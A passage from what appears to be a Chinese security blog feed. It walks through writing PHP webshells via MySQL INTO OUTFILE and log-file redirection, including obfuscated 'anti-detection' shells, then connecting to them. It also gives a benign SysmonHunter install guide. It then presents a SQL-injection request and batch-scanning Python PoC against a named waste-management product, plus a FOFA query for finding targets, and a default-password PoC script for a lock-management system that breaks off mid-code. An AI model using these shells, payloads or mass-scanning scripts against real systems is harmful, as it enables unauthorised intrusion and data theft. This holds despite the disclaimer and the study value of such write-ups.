+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 into outfile &#x27;C:\info.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo();?&gt;&#x27;%23</span><br></pre></td></tr></table></figure>
+
+<p><strong>代替空格的方法</strong></p>
+<p><code>+</code>号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、<code>/**/</code>注释符等</p>
+<h4 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a><code>into oufile</code> 写 shell</h4><p>查询MySQL是否没有 secure_file_priv 限制；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">NULL</td>
+<td align="left">不允许导入或导出</td>
+</tr>
+<tr>
+<td align="left">/tmp</td>
+<td align="left">只允许在 /tmp 目录导入导出</td>
+</tr>
+<tr>
+<td align="left">空</td>
+<td align="left">不限制目录</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>说明：</p>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件。</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件。</p>
+</blockquote>
+<h5 id="原生一句话shell"><a href="#原生一句话shell" class="headerlink" title="原生一句话shell"></a>原生一句话shell</h5><p>满足上<code>secure_file_priv</code>为空的条件，那么可以尝试使用下面原生的 SQL 语句来直接写 一句话木马（直接在MySQL中执行）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="sqlmap写入shell"><a href="#sqlmap写入shell" class="headerlink" title="sqlmap写入shell"></a>sqlmap写入shell</h5><p>sqlmap 中可以如下操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --file-write=&#x27;shellpass.php&#x27; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="into-dumpfile写shell"><a href="#into-dumpfile写shell" class="headerlink" title="into dumpfile写shell"></a><code>into dumpfile</code>写shell</h4><p>突破<code>secure-file-priv</code>写shell;</p>
+<blockquote>
+<p>日志文件写shell，前提：</p>
+<ul>
+<li>Web 文件夹宽松权限可以写入</li>
+<li>Windows 系统下</li>
+<li>高权限运行 MySQL 或者 Apache</li>
+</ul>
+</blockquote>
+<p>说到底，就是修改MySQL的日志变量路径为shell.php。一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
+<h5 id="普通型shell"><a href="#普通型shell" class="headerlink" title="普通型shell"></a>普通型shell</h5><p>在MySQL命令行中依次执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;	--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="line">set global general_log = on;		--开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="line">set global general_log_file = &#x27;C:\\phpStudy\\WWW\\shell\\shell.php&#x27;;		--设置日志路径</span><br><span class="line"># 若出现以下报错信息说明此MySQL用户没用写入目录文件的权限：</span><br><span class="line">ERROR 1231 (42000): Variable &#x27;general_log_file&#x27; can&#x27;t be set to the value of &#x27;C:</span><br><span class="line">\phpStudy\WWW\shell\shell.php&#x27;</span><br><span class="line">* 解决：手工在C:\phpStudy\WWW\shell\目录下新建shell.php文件</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;;		--执行查询，写入shell</span><br></pre></td></tr></table></figure>
+
+<p>具体操作如下演示；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%general%&#x27;;</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">| Variable_name    | Value                              |</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">| general_log      | ON                                 |</span><br><span class="line">| general_log_file | C:\phpStudy\MySQL\data\long-PC.log |</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global general_log = on;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global general_log_file = &#x27;C:\\phpStudy\\WWW\\shell\\shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | ON                              |</span><br><span class="line">| general_log_file | C:\phpStudy\WWW\shell\shell.php |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| &lt;?php @eval($_POST[pass])?&gt; |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| &lt;?php @eval($_POST[pass])?&gt; |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="免杀型shell"><a href="#免杀型shell" class="headerlink" title="免杀型shell"></a>免杀型shell</h5><p>利用改变MySQL日志变量环境写shell，还可以写入具有一定免杀性的shell；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php $sl = create_function(&#x27;&#x27;, @$_REQUEST[&#x27;klion&#x27;]);$sl();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line">SELECT &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;username&#x27;]));?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="隐蔽型shell"><a href="#隐蔽型shell" class="headerlink" title="隐蔽型shell"></a>隐蔽型shell</h5><p>利用改变MySQL日志变量环境写shell，还可以利用MySQL的特性<code>慢查询</code>来写shell；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</span><br><span class="line">show variables like &#x27;%slow_query_log%&#x27;;		--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;				--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;	--修改日志文件路径</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(11);				--写shell</span><br></pre></td></tr></table></figure>
+
+<h4 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h4><p>使用<a href="https://github.com/AntSwordProject/antSword">中国蚁剑</a>连接shell；</p>
+<p>浏览器访问shell：<a href="http://192.168.220.130/shell/shell.php">http://192.168.220.130/shell/shell.php</a></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191655678.png" alt="image-20211101191655678"></p>
+<p>添加一条shell数据；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191826638.png" alt="image-20211101191826638"></p>
+<p>启用虚拟终端执行命令；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191936639.png" alt="image-20211101191936639"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://dropann.github.io/p/9409b6b3.html">https://dropann.github.io/p/9409b6b3.html</a></li>
+<li><a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SysmonHunter安装</title>
+    <url>/2021/10/30/SysmonHunter%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
+<p>编写“Threat Hunt系列”的指导文章主要原因是，安全研究人员在编写渗透测试文章后并没有提供检测技术。渗透测试人员虽然完成了很多出色的工作、描述了对手所使用的工具和技术，但是只有少数人愿意共享出用于检测他们所使用的工具或者编写的代码。</p>
+<p>本文主要讲述<a href="https://github.com/baronpan/SysmonHunter">SysmonHunter</a>的安装部署及基本使用。</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><blockquote>
+<ol>
+<li><p>安装环境：centos 7；</p>
+</li>
+<li><p>SysmonHunter项目下载地址：<a href="https://github.com/baronpan/SysmonHunter">https://github.com/baronpan/SysmonHunter</a></p>
+<blockquote>
+<p>默认安装路径/root</p>
+</blockquote>
+</li>
+<li><p>Elasticsearch</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/y472360651/article/details/78751859">安装jdk1.8.0</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_41846320/article/details/81251990">安装Elasticsearch 6.3.0</a></p>
+<p><code>wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.3.0.tar.gz</code></p>
+<p>默认安装路径：/opt/elasticsearch-6.3.0/</p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.csdn.net/u014516601/article/details/82687895">安装Elasticsearch 6.3的head插件</a></p>
+<p>Head插件安装路径：/opt/elasticsearch-6.3.0/head</p>
+</blockquote>
+</li>
+<li><p>Neo4j安装</p>
+<blockquote>
+<p><code>apt install neo4j</code></p>
+<p>安装完后，默认用户密码:neo4j/neo4j</p>
+<p>默认安装路径：/usr/share/neo4j</p>
+</blockquote>
+</li>
+<li><p>Python 2.7.x安装</p>
+<blockquote>
+<p>kali上默认2.7.15，安装SysmonHunter三方python库：<code>pip install -r requirements.txt</code></p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<h2 id="服务外连配置"><a href="#服务外连配置" class="headerlink" title="服务外连配置"></a>服务外连配置</h2><ol>
+<li><p><strong>Web应用开启外连；</strong></p>
+<p>执行<code>vim server.py</code>，配置如下：</p>
+</li>
+</ol>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wpsA13A.tmp.jpg" alt="img"></p>
+<ol start="2">
+<li><p><strong>es组件开启外连；</strong></p>
+<p>执行<code>vim elasticsearch.yml</code>，配置如下：</p>
+</li>
+</ol>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wps4873.tmp.jpg" alt="img"></p>
+<p>​        配置es组件允许head跨域连接，配置如下：</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wpsAD97.tmp.jpg" alt="img"></p>
+<ol start="3">
+<li><p>配置neo4j允许外连;</p>
+<p>执行<code>vim  neo4j.conf</code>，配置如下：</p>
+</li>
+</ol>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wps132E.tmp.jpg" alt="img"></p>
+<h2 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h2><ul>
+<li>开启图数据库：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root# neo4j start   </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开启ES</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root# useradd es</span><br><span class="line">root# su es</span><br><span class="line">es$ /opt/elasticsearch-6.3.0/bin/elasticsearch -d</span><br><span class="line">es$ exit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开启ES head插件服务</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root# cd /opt/elasticsearch-6.3.0/head</span><br><span class="line">root# nohup grunt server &amp;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开启项目web应用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root# cd /root/SysmonHunter/</span><br><span class="line">root# python server.py -c conf/example.conf</span><br></pre></td></tr></table></figure>
+
+<h2 id="客户端传输数据"><a href="#客户端传输数据" class="headerlink" title="客户端传输数据"></a>客户端传输数据</h2><p>使用Python脚本将客户端的数据传输至服务端处理，并推送到ES。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python agent.py -c conf/example.conf -t csv -i test.csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wpsCC9E.tmp.jpg" alt="img"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wpsF258.tmp.jpg" alt="img"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wps8790.tmp.jpg" alt="img"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wps5096.tmp.jpg" alt="img"></p>
+]]></content>
+      <categories>
+        <category>Threat Hunt</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SQL注入-智能垃圾分类管理系统</title>
+    <url>/2021/10/30/SQL%E6%B3%A8%E5%85%A5-%E6%99%BA%E8%83%BD%E5%9E%83%E5%9C%BE%E5%88%86%E7%B1%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>智慧垃圾分类管理系统应用于智能垃圾桶、厨余垃圾桶、智能果皮箱生产的企业，依托AI技术、人脸识别、移动互联网、大数据、物联网等。该系统存在sql注入漏洞，攻击者可获取数据库敏感信息。</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>全版本？</p>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;智能垃圾分类管理系统&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211030173323420.png" alt="image-20211030173323420"></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>无</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在登录页面使用burp抓取页面流量；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101090915969.png" alt="image-20211101090915969"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /ghc_master/data/action.admindata.php HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx</span><br><span class="line">Content-Length: 96</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.62</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://xxx.xxx.xxx.xxx</span><br><span class="line">Referer: http://xxx.xxx.xxx.xxx/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">do=adminlogin&amp;username=admin&#x27; AND (SELECT 2847 FROM (SELECT(SLEEP(5)))trlL)-- sNmL&amp;password=4224</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211030173422648.png" alt="image-20211030173422648"></p>
+<p>如果在5秒后返回了1，说明存在sql注入漏洞；</p>
+<h3 id="批量POC"><a href="#批量POC" class="headerlink" title="批量POC"></a>批量POC</h3><p>以下python脚本，可批量进行检测；</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning  <span class="comment">#消除警告</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  <span class="comment"># 消除警告</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longer</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+++FOFA:title=&quot;智能垃圾分类管理系统&quot;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+++python xxx.py -u/--url http://xxx.xxx.xxx.xxx&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+++python xxx.py -f/--file xxx.txt&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+++作者:longer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-----------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    longer()</span><br><span class="line">    sys.exit()</span><br><span class="line">p = argparse.ArgumentParser(description=<span class="string">&#x27;longer&#x27;</span>)</span><br><span class="line">p.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;目标url&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">p.add_argument(<span class="string">&#x27;-f&#x27;</span>,<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;文件&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">xp = p.parse_args()</span><br><span class="line">url = xp.url</span><br><span class="line">file = xp.file</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;do=adminlogin&amp;username=admin&#x27; AND (SELECT 2847 FROM (SELECT(SLEEP(5)))trlL)-- sNmL&amp;password=4224&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0(Windows NT 10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/90.0.4430.212Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=hfq66id9bum90sovr9gmn7klde&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> url !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    url1 = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = url+<span class="string">&#x27;/ghc_master/data/action.admindata.php&#x27;</span></span><br><span class="line">        r = requests.post(url = url ,headers =headers,data=data ,timeout = <span class="number">15</span>,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.text ==<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(url1 + <span class="string">&#x27;存在sql注入&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(url1+<span class="string">&#x27;不存在sql注入&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(url1+<span class="string">&quot;异常&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> file!= <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(file,<span class="string">&#x27;r+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        url=i.strip()</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&#x27;http:&#x27;</span>) != <span class="number">1</span> <span class="keyword">and</span> url.startswith(<span class="string">&#x27;https:&#x27;</span>) != <span class="number">1</span>:</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">        url =url</span><br><span class="line">        url1 = url</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            t = url + <span class="string">&#x27;/ghc_master/data/action.admindata.php&#x27;</span></span><br><span class="line">            r =requests.post(url=url,data=data,headers=headers,timeout=<span class="number">15</span>,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(url1+<span class="string">&#x27;存在sql注入&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(url1+<span class="string">&#x27;不存在注入&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(url1+<span class="string">&#x27;异常&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>锁群管理系统v2.0存在弱口令漏洞</title>
+    <url>/2021/11/01/%E9%94%81%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fv2.0%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>锁群管理系统v2.0存在弱口令漏洞。</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>锁群管理系统v2.0</p>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;锁群管理系统v2.0&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>无</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>万能的度娘上查询到锁群管理系统操作手册里面有账号和密码；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101201939208.png" alt="image-20211101201939208"></p>
+<p>后台界面如下；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101202459009.png" alt="image-20211101202459009"></p>
+<p>在后台登陆界面使用操作手册里面的账号和密码成功的登录后台；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101202427411.png" alt="image-20211101202427411"></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning  <span class="comment">#消除警告</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  <span class="comment"># 消除警告</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longer</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;python xxx.py -u/--url http://xxx.xxx.xxx.xxx&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;python xxx.py -f/--file x.txt&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;FOFA:title=&quot;锁群管理系统v2.0&quot;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;longer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)==<span class="number">1</span>:</span><br><span class="line">    longer()</span><br><span class="line">    sys.exit()</span><br><span class="line">p = argparse.ArgumentParser(description=<span class="string">&#x27;longer&#x27;</span>)</span><br><span class="line">p.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;输入url&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">p.add_argument(<span class="string">&#x27;-f&#x27;</span>,<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;输入文件&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">a = p.parse_args()</span><br><span class="line"></span><br><span class="line">url = a.url</span><br><span class="line"></span><br><span class="line">file = a.file</span><br><span class="line"></span><br><span class="line">headers= &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;ASP.NET_SessionId=pjb41rehvxilis32hfgus0r5&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> url != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    furl = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url =furl+<span class="string">&#x27;/inc/CheckLogin.aspx?checkLogin=login&amp;un=admin&amp;pw=123456&#x27;</span></span><br><span class="line">        r= requests.get(url=url,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(furl+<span class="string">&#x27;存在弱口令&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(furl+<span class="string">&#x27;不存在弱口令&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(furl+<span class="string">&#x27;不存在弱口令&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    text =file</span><br><span class="line">    f = <span class="built_in">open</span>(text,<span class="string">&#x27;r+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        url = i.strip()</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&#x27;http:&#x27;</span>) != <span class="number">1</span> <span class="keyword">and</span> url.startswith(<span class="string">&#x27;https:&#x27;</span>) != <span class="number">1</span>:</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">        url1 = url</span><br><span class="line">        url2=url</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url1 = url+<span class="string">&#x27;/inc/CheckLogin.aspx?checkLogin=login&amp;un=admin&amp;pw=123456&#x27;</span></span><br><span class="line">            r =requests.post(url=url1,headers=headers,timeout = <span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;0&#x27;</span> <span 